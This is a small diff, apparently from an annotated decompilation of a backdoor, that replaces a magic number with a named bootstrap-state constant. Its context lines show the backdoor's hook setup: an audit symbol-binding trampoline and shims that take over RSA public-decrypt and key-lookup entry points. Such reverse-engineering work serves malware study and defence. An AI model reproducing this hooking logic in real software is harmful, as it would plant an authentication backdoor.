@@ -26,7 +26,7 @@ int hooks_ctx_init_or_wait_for_shared_globals(backdoor_hooks_ctx_t *ctx)
     init_status = 0;
     // AutoDoc: Only burn in the literal hook entry points while we are still waiting for the shared globals to exist.
     if (ctx->shared_globals_ptr == (backdoor_shared_globals_t *)0x0) {
-      ctx->bootstrap_state_flags = 4;
+      ctx->bootstrap_state_flags = HOOKS_CTX_BOOTSTRAP_WAIT_FOR_SHARED_GLOBALS;
       ctx->symbind64_trampoline = (audit_symbind64_fn)&LAB_001028d0;
       ctx->rsa_public_decrypt_entry = rsa_public_decrypt_backdoor_shim;
       ctx->rsa_get0_key_entry = rsa_get0_key_backdoor_shim;
